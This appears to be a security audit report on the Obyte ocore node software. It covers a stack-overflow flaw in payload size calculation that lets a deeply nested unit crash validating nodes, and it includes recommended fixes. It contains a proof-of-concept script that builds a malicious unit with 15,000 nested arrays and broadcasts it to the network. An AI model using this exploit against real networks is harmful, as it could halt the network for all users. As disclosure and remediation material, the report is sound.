# Audit Report: Stack Overflow in Unit Payload Size Calculation

## Summary

The `getLength()` function performs unbounded recursion when calculating unit payload sizes. During validation, deeply nested data structures (~15,000 array nesting levels) exhaust the JavaScript call stack before AA-specific depth validation executes, causing unhandled `RangeError` exceptions that crash all nodes processing the malicious unit. [1](#0-0) 

## Impact

**Severity**: Critical  
**Category**: Network Shutdown

A single malicious unit with deeply nested arrays (~30KB payload, well under the 5MB limit) crashes all validating nodes network-wide. The attack requires only minimal transaction fees and causes indefinite network downtime until emergency patching and unit blacklisting. All transaction processing halts, witness consensus stops, requiring coordinated manual intervention for recovery.

**Affected Parties**: All network nodes (full nodes, witnesses, light clients validating units), all users unable to transact during outage.

**Quantified Impact**: Single unit causes complete network shutdown affecting all participants indefinitely until emergency response completed.

## Finding Description

**Location**: `byteball/ocore/object_length.js:9-40`, function `getLength()`  
Called from: `byteball/ocore/validation.js:138` via `getTotalPayloadSize()`

**Intended Logic**: 
Validation should calculate unit payload size, verify it matches declared `payload_commission`, and reject oversized units. AA definitions exceeding depth limits should be rejected by `MAX_DEPTH=100` validation during message-specific checks. [2](#0-1) [3](#0-2) 

**Actual Logic**: 

The `getLength()` function recursively traverses objects and arrays without any depth limit or recursion counter. For arrays, each element triggers another recursive call; for objects, each property does the same. [4](#0-3) 

During validation, `getTotalPayloadSize()` is invoked without try-catch protection to verify the payload commission matches the calculated size. [5](#0-4) 

This function calls `getLength()` to traverse the entire unit structure including deeply nested payloads. [6](#0-5) 

With approximately 15,000 nesting levels, the JavaScript V8 engine's call stack limit (~10,000-15,000 frames depending on environment) is exceeded, throwing `RangeError: Maximum call stack size exceeded`. This exception is NOT caught because there is no try-catch wrapper around the size calculation calls.

The AA depth validation with `MAX_DEPTH=100` protection exists at line 1577 but executes much later during message-specific validation, never reached due to the earlier crash. [7](#0-6) 

**Exploitation Path**:

1. **Initial bypass of ratio check**: When the unit is first received via WebSocket, `getRatio()` is called which DOES have try-catch protection and returns 1 on stack overflow, allowing the unit to pass this initial check. [8](#0-7) [9](#0-8) 

2. **Proceeds to validation**: The unit passes to `handleOnlineJoint()` which calls `handleJoint()` and then `validation.validate()`. [10](#0-9) [11](#0-10) 

3. **Unprotected size calculation**: At validation line 138, `getTotalPayloadSize()` is called WITHOUT try-catch protection.

4. **Stack overflow occurs**: `getLength()` recursively descends through 15,000 nesting levels, exhausts the call stack, and throws uncaught `RangeError`.

5. **Process crashes**: The exception bubbles up through the call stack with no handler, terminating the Node.js process.

6. **Network-wide impact**: All nodes receiving the unit experience identical crashes and cannot recover until the unit is blacklisted.

**Security Property Broken**: 
Network Resilience Invariant - Nodes must validate and gracefully reject malformed units without crashing.

**Root Cause**:
- `getLength()` lacks depth parameter, recursion counter, or maximum depth check
- No try-catch protection around size calculations in validation.js lines 136-139
- Validation ordering places size calculation before message-specific validation containing depth limits
- AA depth protection at line 1577 bypassed by earlier crash

## Impact Explanation

**Affected Assets**: Network availability, all pending transactions, consensus mechanism.

**Damage Severity**:
- **Quantitative**: Single 30KB unit causes complete network shutdown. All nodes crash simultaneously. Network downtime continues indefinitely (hours to days) until coordinated emergency response.
- **Qualitative**: Total loss of network availability. Users cannot send transactions, witnesses cannot post heartbeats, consensus mechanism halts.

**User Impact**:
- **Who**: All network participants - full nodes, light clients, witnesses, all users
- **Conditions**: Exploitable during any network state; no special conditions required
- **Recovery**: Requires emergency coordination to blacklist malicious unit hash, deploy patched node software, and restart all nodes

**Systemic Risk**:
- **Attack Cost**: Minimal (only transaction fees, ~1000 bytes or less)
- **Detection**: Attack succeeds immediately; nodes crash before logging malicious unit
- **Repeatability**: Attacker can submit multiple such units with different hashes until network implements blacklist

## Likelihood Explanation

**Attacker Profile**:
- **Identity**: Any user with Obyte address capable of broadcasting units to network
- **Resources Required**: Minimal - transaction fees only (under $1 equivalent)
- **Technical Skill**: Low - generating deeply nested JSON arrays is trivial with any programming language

**Preconditions**:
- **Network State**: Normal operation; no special conditions required
- **Attacker State**: Only needs ability to broadcast units to any peer
- **Timing**: No timing constraints; attack succeeds upon validation

**Execution Complexity**:
- **Transaction Count**: Single malicious unit sufficient
- **Coordination**: No coordination required
- **Detection Risk**: None - attack succeeds before detection possible

**Frequency**:
- **Repeatability**: Unlimited - attacker can craft multiple variants
- **Scale**: Single unit affects entire network

**Overall Assessment**: Very High - Trivial to execute, guaranteed success, network-wide impact, minimal cost.

## Recommendation

**Immediate Mitigation**:
Add maximum depth limit to `getLength()` function:

```javascript
// File: byteball/ocore/object_length.js
// Add depth parameter and check

function getLength(value, bWithKeys, depth) {
    if (!depth) depth = 0;
    if (depth > 1000) // reasonable limit well below stack size
        throw Error("data structure nesting too deep: " + depth);
    // ... existing logic, passing depth+1 to recursive calls
}
```

**Permanent Fix**:
Wrap size calculation calls in try-catch blocks:

```javascript
// File: byteball/ocore/validation.js
// Lines 136-139

try {
    if (objectLength.getHeadersSize(objUnit) !== objUnit.headers_commission)
        return callbacks.ifJointError("wrong headers commission");
    if (objectLength.getTotalPayloadSize(objUnit) !== objUnit.payload_commission)
        return callbacks.ifJointError("wrong payload commission");
} catch(e) {
    return callbacks.ifJointError("size calculation failed: " + e);
}
```

**Additional Measures**:
- Add test case verifying deeply nested structures are rejected gracefully
- Add monitoring to detect units causing validation exceptions
- Consider applying depth limits during JSON parsing phase

## Proof of Concept

```javascript
const composer = require('ocore/composer.js');
const network = require('ocore/network.js');

// Generate deeply nested array
function createDeeplyNestedArray(depth) {
    let result = [];
    for (let i = 0; i < depth; i++) {
        result = [result];
    }
    return result;
}

// Create malicious AA definition with 15000 nesting levels
const maliciousDefinition = [
    'autonomous agent',
    {
        messages: [
            {
                app: 'payment',
                payload: {
                    asset: 'base',
                    outputs: [
                        {
                            address: 'ATTACKER_ADDRESS',
                            amount: 1000
                        }
                    ]
                },
                if: createDeeplyNestedArray(15000) // This will cause stack overflow
            }
        ]
    }
];

// Compose and broadcast unit with malicious definition
composer.composeJoint({
    paying_addresses: ['ATTACKER_ADDRESS'],
    outputs: [],
    messages: [
        {
            app: 'definition',
            payload: {
                definition: maliciousDefinition
            }
        }
    ],
    signer: headersSigner,
    callbacks: {
        ifOk: function(objJoint) {
            // Broadcast to network - all validating nodes will crash
            network.broadcastJoint(objJoint);
        },
        ifError: function(err) {
            console.error('Composition error:', err);
        }
    }
});

// Expected result: All nodes attempting to validate this unit will crash with:
// RangeError: Maximum call stack size exceeded
// at getLength (object_length.js:24)
// at getLength (object_length.js:24)
// ... [repeated ~15000 times]
```

**Notes**

The vulnerability exists because:

1. **Early protection catches but doesn't prevent**: The `getRatio()` check at network message reception has try-catch protection, but it returns 1 on error allowing the unit to proceed to validation. [12](#0-11) 

2. **Critical validation lacks protection**: The size calculation during validation has NO try-catch wrapper despite performing the same recursive traversal. [13](#0-12) 

3. **Depth limit exists but executes too late**: AA-specific depth validation with `MAX_DEPTH=100` exists but only executes during message validation at line 1577, after the size calculation has already crashed the process. [7](#0-6) 

4. **Size vs depth**: A 30KB payload with 15,000 nesting levels easily fits within the 5MB `MAX_UNIT_LENGTH` limit but far exceeds JavaScript's stack size. [14](#0-13) 

This is a critical network resilience failure where malformed input causes complete node failure rather than graceful rejection.

### Citations

**File:** object_length.js (L9-40)
```javascript
function getLength(value, bWithKeys) {
	if (value === null)
		return 0;
	switch (typeof value){
		case "string": 
			return value.length;
		case "number": 
			if (!isFinite(value))
				throw Error("invalid number: " + value);
			return 8;
			//return value.toString().length;
		case "object":
			var len = 0;
			if (Array.isArray(value))
				value.forEach(function(element){
					len += getLength(element, bWithKeys);
				});
			else    
				for (var key in value){
					if (typeof value[key] === "undefined")
						throw Error("undefined at "+key+" of "+JSON.stringify(value));
					if (bWithKeys)
						len += key.length;
					len += getLength(value[key], bWithKeys);
				}
			return len;
		case "boolean": 
			return 1;
		default:
			throw Error("unknown type="+(typeof value)+" of "+value);
	}
}
```

**File:** object_length.js (L61-67)
```javascript
function getTotalPayloadSize(objUnit) {
	if (objUnit.content_hash)
		throw Error("trying to get payload size of stripped unit");
	var bWithKeys = (objUnit.version !== constants.versionWithoutTimestamp && objUnit.version !== constants.versionWithoutKeySizes);
	const { temp_data_length, messages_without_temp_data } = extractTempData(objUnit.messages);
	return Math.ceil(temp_data_length * constants.TEMP_DATA_PRICE) + getLength({ messages: messages_without_temp_data }, bWithKeys);
}
```

**File:** object_length.js (L104-113)
```javascript
function getRatio(objUnit) {
	try {
		if (objUnit.version !== constants.versionWithoutTimestamp && objUnit.version !== constants.versionWithoutKeySizes)
			return 1;
		return getLength(objUnit, true) / getLength(objUnit);
	}
	catch (e) {
		return 1;
	}
}
```

**File:** aa_validation.js (L28-28)
```javascript
var MAX_DEPTH = 100;
```

**File:** aa_validation.js (L472-473)
```javascript
		if (depth > MAX_DEPTH)
			return cb("cases for " + field + " go too deep");
```

**File:** validation.js (L136-141)
```javascript
		if (objectLength.getHeadersSize(objUnit) !== objUnit.headers_commission)
			return callbacks.ifJointError("wrong headers commission, expected "+objectLength.getHeadersSize(objUnit));
		if (objectLength.getTotalPayloadSize(objUnit) !== objUnit.payload_commission)
			return callbacks.ifJointError("wrong payload commission, unit "+objUnit.unit+", calculated "+objectLength.getTotalPayloadSize(objUnit)+", expected "+objUnit.payload_commission);
		if (objUnit.headers_commission + objUnit.payload_commission > constants.MAX_UNIT_LENGTH && !bGenesis)
			return callbacks.ifUnitError("unit too large");
```

**File:** validation.js (L1577-1577)
```javascript
			aa_validation.validateAADefinition(payload.definition, readGetterProps, objValidationState.last_ball_mci, function (err) {
```

**File:** network.js (L1025-1027)
```javascript
	var validate = function(){
		mutex.lock(['handleJoint'], function(unlock){
			validation.validate(objJoint, {
```

**File:** network.js (L1190-1210)
```javascript
function handleOnlineJoint(ws, objJoint, onDone){
	if (!onDone)
		onDone = function(){};
	var unit = objJoint.unit.unit;
	delete objJoint.unit.main_chain_index;
	delete objJoint.unit.actual_tps_fee;
	
	handleJoint(ws, objJoint, false, false, {
		ifUnitInWork: onDone,
		ifUnitError: function(error){
			sendErrorResult(ws, unit, error);
			onDone();
		},
		ifTransientError: function(error) {
			sendErrorResult(ws, unit, error);
			onDone();
			if (error.includes("tps fee"))
				setTimeout(handleOnlineJoint, 10 * 1000, ws, objJoint);
		},
		ifJointError: function(error){
			sendErrorResult(ws, unit, error);
```

**File:** network.js (L2594-2595)
```javascript
				if (objectLength.getRatio(objJoint.unit) > 3)
					return sendError(ws, "the total size of keys is too large");
```

**File:** constants.js (L58-58)
```javascript
exports.MAX_UNIT_LENGTH = process.env.MAX_UNIT_LENGTH || 5e6;
```
